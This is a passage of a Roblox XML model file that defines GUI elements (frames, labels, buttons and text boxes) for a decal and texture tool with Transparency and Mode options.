											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">2</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX89D59DDA592445F8BD5302079DFAA0F6">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4285215356</Color3>
									<float name="BackgroundTransparency">0</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">BottomColorBar</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>5</XO>
										<YS>1</YS>
										<YO>-2</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>2</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="Frame" referent="RBX1F70B19B03C445AAA87854F437163F54">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">TransparencyOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>14</XO>
										<YS>0</YS>
										<YO>135</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>25</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX726EE9BA835043E19D1945A1C0110FDC">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Transparency</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX855B49FD74404DE48BDC5227072A929B">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">TransparencyInput</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>75</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>45</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextButton" referent="RBX8673597A69B8431D8DE50765A754E4B3">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">false</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">TextButton</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBXE73F40783A6B49539C1C9C81E75CC0DB">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX1B07FA6A4E0A456CA77D80F768642AA8">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-4</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBX9B978C5BF2E84470AC72579513847230">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">TextBox</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">0</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX315E796DC9294C9A824F6AAFFDF66DB6">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">ModeOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX70F427F236524776A5800F65569632C4">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>14</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>40</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Mode</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX892CB1DB2629443FA58C64CD0E95CA22">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Decal</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>55</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBXA6E24EFE5FC1485DB06432D3A5E3FE84">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>7</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-7</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextButton" referent="RBX112C688D23EB441AA09664DC53B2DB1D">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">Button</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">1</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX3C1213EA58464C41A1DC0F83D9812FAE">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextLabel" referent="RBX9194A91231EC493C819DB4B6718B3FD9">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">Label</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">DECAL</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX9E6C9606EE3F4C2BA82411B40FB5356C">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Texture</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>122</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextButton" referent="RBXC1CF98D54B8649638C2090AFCCA4ED06">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">Button</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">1</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX1711DEB3D47D473389BB56E27E17F118">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextLabel" referent="RBXC36550DD00AD4169812EF04C68BF8154">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">Label</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">TEXTURE</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX1BA1D067428D4CF8BEECCA02025C6ED4">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
